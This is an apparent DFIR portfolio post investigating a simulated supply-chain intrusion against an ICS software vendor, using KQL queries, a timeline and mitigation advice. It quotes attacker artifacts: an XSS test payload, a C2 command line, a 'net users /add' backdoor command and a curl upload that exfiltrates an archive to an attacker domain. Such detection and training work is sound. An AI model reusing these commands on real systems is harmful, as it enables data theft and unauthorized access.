---
layout: post
title: "Operation DOCKSHOCK: ICS Blueprints Compromise"
date: 2026-06-20
categories: [threat-detection, dfir-portfolio]
tags: [Critical Infrastructure, Supply Chain]
focus: "KQL, EDR Telemetry, MITRE ICS"
description: "Triaging a complex supply-chain intrusion targeting regional energy distribution. Tracks the complete lifecycle from perimeter XSS probing and weaponized phishing documents to lateral movement and source-code exfiltration using raw web utilities."
permalink: /blog/operation-dockshock.html
type: "Case Study"
discipline: "Threat Detection Engineering"
math: false
---

<div class="lab-post">
  <div class="lab-post-tags">
    <span class="tag tag-red">ICS Security</span>
    <span class="tag tag-blue">Supply Chain</span>
    <span class="tag tag-green">EDR Telemetry</span>
    <span class="tag tag-purple">DFIR</span>
  </div>

  <p class="lab-post-lead">
    This incident investigation report details the analysis of <strong>Operation DOCKSHOCK</strong>, a highly sophisticated, multi-stage supply chain espionage campaign targeting <strong>Solvi Systems</strong>. Solvi Systems develops the DOCKS Industrial Control Systems (ICS) software, governing energy distribution infrastructure across South Africa, Mozambique, Eswatini, Zimbabwe, and Namibia.
  </p>

  <div class="insight-grid">
    <div class="insight-card">
      <p class="insight-label">Initial Vector</p>
      <p>Targeted spear-phishing delivering a weaponized macro-enabled office document.</p>
    </div>
    <div class="insight-card">
      <p class="insight-label">Target Assets</p>
      <p>Software Development Lifecycle (SDLC) repositories and DOCKS system source code files.</p>
    </div>
    <div class="insight-card">
      <p class="insight-label">Exfiltration Vector</p>
      <p>Data compressed into encrypted ZIP archives and sent outbound via cURL to a rogue API endpoint.</p>
    </div>
  </div>

  <div class="toc-inline">
    <p>Contents</p>
    <ol>
      <li><a href="#timeline">Incident Timeline</a></li>
      <li><a href="#phase-1">Phase 1: Baseline Assessment & Perimeter Triage</a></li>
      <li><a href="#phase-2">Phase 2: Web Exploitation Analysis (WAF Deflection)</a></li>
      <li><a href="#phase-3">Phase 3: Initial Access via Spear-Phishing</a></li>
      <li><a href="#phase-4">Phase 4: Command & Control (C2) & Local Persistence</a></li>
      <li><a href="#phase-5">Phase 5: Lateral Movement & SDLC Data Exfiltration</a></li>
      <li><a href="#mitigation">Strategic Defense & Mitigation Recommendations</a></li>
    </ol>
  </div>

  <h2 id="timeline" class="anchor">1. Incident Timeline</h2>
  
  <p>All timestamps are in UTC. The target compromise and exfiltration window spanned May 1, 2024 – May 28, 2024.</p>

  <div class="callout callout-info">
    <div class="callout-title">Chronological Intrusion Sequence</div>
    <ul class="callout-list">
      <li><strong>May 01, 00:00 UTC:</strong> Initial automated web reconnaissance of DOCKS product documentation begins.</li>
      <li><strong>May 01, 15:51 UTC:</strong> Phishing email delivered to Sales Rep Carla Wharton.</li>
      <li><strong>May 01, 15:57 UTC:</strong> User executes link; <code>ecobug.exe</code> payload successfully dropped.</li>
      <li><strong>May 01, 17:38 UTC:</strong> C2 persistence established (Outbound beaconing over TCP/1337).</li>
      <li><strong>May 02, 16:50 UTC:</strong> Privilege Escalation: Backdoor admin account <code>gu@rd!an</code> created.</li>
      <li><strong>May 27, 16:23 UTC:</strong> Lateral Movement: Compromise of Alexei Petrov's engineering host (<code>SJ9V-MACHINE</code>).</li>
      <li><strong>May 27, 16:45 UTC:</strong> Data Staging: Core SDLC and DOCKS system source code compressed.</li>
      <li><strong>May 28, (Subsequent):</strong> Data Exfiltration: <code>CollectedData.zip</code> exfiltrated via curl web POST.</li>
    </ul>
  </div>

  <h2 id="phase-1" class="anchor">2. Phase 1: Baseline Assessment & Perimeter Triage</h2>
  
  <p>
    The investigation initiated with an environment baseline analysis. The corporate headcount was validated at <strong>500 employees</strong>, and the core executive profile for Chief Technology Officer (CTO) <strong>Alexis Khoza</strong> was mapped out to identify potential high-value targeting.
  </p>

  <h3>KQL Query 1: Identifying the target profile of the CTO</h3>
  <pre data-lang="kql"><code>Employees
| where role == "CTO"</code></pre>

  <h3>KQL Query 2: Quantifying inbound communications to the executive tier</h3>
  <pre data-lang="kql"><code>Email
| where recipient == "alexis_khoza@solvisystems.com"
| count</code></pre>
  
  <p>
    <strong>Result:</strong> 31 inbound emails identified. Baseline network profiling also revealed that the threat actor was aggressively monitoring the domain, hunting for organizational context surrounding the docks-ics product string.
  </p>

  <h2 id="phase-2" class="anchor">3. Phase 2: Web Exploitation Analysis (WAF Deflection)</h2>

  <p>
    On May 3, 2024, the Web Application Firewall (WAF) triggered a High-severity alert indicating an inbound Cross-Site Scripting (XSS) exploit attempt on the corporate feedback portal.
  </p>

  <h3>KQL Query 3: Isolating the WAF payload footprint in web logs</h3>
  <pre data-lang="kql"><code>InboundNetworkEvents
| where url contains "alert"
| project timestamp, src_ip, user_agent, url, status_code</code></pre>

  <p>Investigation of the web logs confirmed the following threat details:</p>
  <ul>
    <li><strong>Attacker Payload:</strong> <code>&lt;/script&gt;&lt;script&gt;alert('xss')&lt;/script&gt;</code></li>
    <li><strong>WAF Mitigation Status:</strong> Deflected. The web server responded with a <strong>404 Status Code</strong>, preventing script execution.</li>
    <li><strong>Attacker User Agent:</strong> <code>Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00</code></li>
  </ul>
  
  <p>
    Expanding the search window around this user agent exposed a cluster of <strong>4 malicious IP addresses</strong> (<code>98.117.26.236</code>, <code>13.201.46.208</code>, <code>105.78.23.64</code>, <code>56.6.30.190</code>) executing <strong>9 distinct exploitation requests</strong> across a multi-day window. Passive DNS correlation mapping these IPs revealed 3 rogue domains staged for secondary deployment:
  </p>
  <ol>
    <li><code>energy-trends4u.net</code></li>
    <li><code>news-on-industry.com</code></li>
    <li><code>eco-awareness-update.net</code></li>
  </ol>

  <h2 id="phase-3" class="anchor">4. Phase 3: Initial Access via Spear-Phishing</h2>

  <p>
    Deflected at the web perimeter, the adversary pivoted to a targeted phishing campaign. Over 56 malicious emails were distributed across the network, specifically targeting roles managing the utility software tier.
  </p>

  <h3>KQL Query 4: Correlating adversary infrastructure to weaponized emails</h3>
  <pre data-lang="kql"><code>let actor_ips = pack_array("98.117.26.236","13.201.46.208","105.78.23.64","56.6.30.190");
let adv_domains = PassiveDns | where ip in (actor_ips) | distinct domain;
Email
| where link has_any (adv_domains)
| order by timestamp asc</code></pre>

  <p>
    The patient zero entry vector occurred on <strong>May 1, 2024, at 15:51:41 UTC</strong>. Carla Wharton (<code>cawharton</code>), a Sales Representative on host <code>JUSP-LAPTOP</code>, received a weaponized lure:
  </p>
  <ul>
    <li><strong>Sender:</strong> <code>news@eco-awareness-updates.net</code> (Reply-To: <code>electric_updates@gmail.com</code>)</li>
    <li><strong>Subject:</strong> <code>[EXTERNAL] Business Opportunity: Two major energy companies merging</code></li>
    <li><strong>Lure Link:</strong> <code>http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx</code></li>
  </ul>
  <p>
    At <strong>15:57:41 UTC</strong>, endpoint records confirm that the user executed the link. Within less than two minutes, a compilation macro dropped a standalone malicious payload onto the filesystem:
  </p>
  <ul>
    <li><strong>Path:</strong> <code>C:\ProgramData\ecobug.exe</code></li>
    <li><strong>SHA256 Hash:</strong> <code>1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252</code></li>
  </ul>

  <h2 id="phase-4" class="anchor">5. Phase 4: Command & Control (C2) & Local Persistence</h2>

  <p>
    At <strong>17:38:25 UTC</strong>, <code>ecobug.exe</code> initiated its outbound connection architecture to stabilize access.
  </p>

  <h3>KQL Query 5: Identifying the C2 execution telemetry on the host</h3>
  <pre data-lang="kql"><code>ProcessEvents
| where hostname == "JUSP-LAPTOP" and process_name == "cmd.exe"
| where process_commandline contains "ecobug.exe"</code></pre>

  <ul>
    <li><strong>C2 Command Line:</strong> <code>ecobug.exe --timeout 6000 --dest 98.117.26.236 --port 1337</code></li>
    <li><strong>Beaconing Signature:</strong> The malware operated on a strict automated cadence, initiating an outbound connection over <strong>TCP Port 1337</strong> exactly 1 time per day at 17:38:25.</li>
    <li><strong>Scope of Compromise:</strong> Expanding the beacon signature across the enterprise revealed <strong>470 total persistent connections</strong> impacting <strong>38 unique employee endpoints</strong>.</li>
  </ul>

  <p>
    Once active on <code>JUSP-LAPTOP</code>, the threat actor spawned localized commands to create an access bridge, provisioning a permanent local administrator backdoor:
  </p>
  <pre data-lang="cmd"><code>net users /add gu@rd!an abc1toothree</code></pre>

  <h2 id="phase-5" class="anchor">6. Phase 5: Lateral Movement & SDLC Data Exfiltration</h2>

  <p>
    Using an identified variation in execution habit (<code>net use /PERSISTENT:YES</code>), the adversary moved laterally across the network segment on <strong>May 27, 2024, at 16:23:10 UTC</strong>, successfully compromising <code>SJ9V-MACHINE</code>. This host belonged to <strong>Alexei Petrov</strong>, the Docks Customer Success Manager.
  </p>
  <p>
    The adversary immediately targeted the file share holding the core source configuration blueprints for the DOCKS ICS system:
  </p>

  <h3>KQL Query 6: Tracking file accumulation and staging actions</h3>
  <pre data-lang="kql"><code>ProcessEvents
| where hostname == "SJ9V-MACHINE" and process_commandline contains "Copy-Item"</code></pre>

  <ul>
    <li><strong>Data Scrape Command:</strong> <code>Copy-Item -Path \\solvisystems.com\SharedDocs\SoftwareDevelopment\CycleDocuments\* -Destination C:\Users\alpetrov\CollectedData\Software_Cycle_Docs</code></li>
  </ul>
  <p>
    The stolen contents were compressed locally into a single staging zip file titled <code>CollectedData.zip</code>. Concurrently, the attacker compromised three distinct internal accounts to browse the developer intranet (<code>devportal.solvisystems.com</code>) and read the <code>internal_process.pdf</code> deployment documentation. The adversary even used compromised mailboxes to distribute phishing messages internally under urgent security headings (<em>Urgent Request: DOCKS System Documentation</em>) to gather structural details.
  </p>
  <p>
    On <strong>May 28, 2024</strong>, the adversary leveraged a raw web utility to bypass standard file transfer protocol tracking and exfiltrated the source blueprint archive directly over an encrypted web endpoint:
  </p>

  <h3>KQL Query 7: Catching the final data exfiltration process command</h3>
  <pre data-lang="kql"><code>ProcessEvents
| where process_commandline contains "curl" and process_commandline contains "upload"</code></pre>

  <ul>
    <li><strong>Exfiltration Command Line:</strong> <code>curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload</code></li>
  </ul>

  <h2 id="mitigation" class="anchor">7. Strategic Defense & Mitigation Recommendations</h2>

  <p>
    Based on the multi-layer tactical breakdown of Operation DOCKSHOCK, the following Tier-2 defense architecture changes are mandated for deployment:
  </p>
  <ol>
    <li>
      <strong>Network Architecture Micro-Segmentation (IT/OT Defenses):</strong>
      Implement explicit network boundaries isolating the engineering software compilation zone (<code>devportal.solvisystems.com</code> and <code>SharedDocs</code>) from general corporate sales and operations tiers. Inter-zone file transfers must be gated behind multi-factor authorization proxies.
    </li>
    <li>
      <strong>Strict Egress Application Whitelisting:</strong>
      Block all outbound perimeter egress over arbitrary high ports (such as TCP/1337). Restrict command-line web automation utilities like curl and Invoke-WebRequest on user endpoints through AppLocker or an equivalent Endpoint Detection and Response (EDR) policy to halt automated exfiltration pipelines.
    </li>
    <li>
      <strong>Local Administrator Restriction & Account Creation Monitoring:</strong>
      Enforce a strict Local Administrator Password Solution (LAPS) framework. Deploy a high-severity alert rule in the SIEM targeting any localized command invocation containing the <code>net user /add</code> or <code>localgroup administrators</code> strings.
    </li>
    <li>
      <strong>Credential Reset & Active Session Invalidation:</strong>
      Force an immediate enterprise-wide password and active-session token reset for all compromised users (e.g., Carla Wharton, Alexei Petrov) and decommission the rogue local administrative profile <code>gu@rd!an</code> across all 38 impacted endpoints.
    </li>
  </ol>
</div>
